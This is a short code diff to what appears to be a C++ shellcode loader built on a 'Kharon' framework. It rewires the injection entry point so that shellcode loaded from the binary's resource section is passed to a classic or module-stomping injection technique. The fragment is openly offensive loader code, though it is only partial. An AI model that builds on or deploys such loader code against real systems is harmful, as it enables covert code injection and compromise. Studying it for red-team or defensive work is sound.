@@ -1,10 +1,10 @@
 #include <Kharon.h>
 
-auto Injection::Main() -> VOID {
+auto Injection::Main(uint8_t * data, size_t size) -> VOID {
 #if INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_CLASSIC
     return Injection::Classic();
 #elif INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_STOMPER
-    return Injection::Stomper();
+    return Injection::Stomper(data, size);
 #endif
 }
 
@@ -46,13 +46,13 @@ auto EntryLoader( VOID ) -> VOID {
         DbgPrint("Failed to load shellcode from .rsrc\n");
         return;
     }
-    Injection::Main();
+    Injection::Main(Shellcode::Data, Shellcode::Size);
 }
 
 #elif SHELLCODE_SECTION_LOCATION == SHELLCODE_SECTION_OTHER
 
 auto EntryLoader( VOID ) -> VOID {
-    Injection::Main();
+    Injection::Main(Shellcode::Data, Shellcode::Size);
 }
 
 #endif // SHELLCODE_SECTION
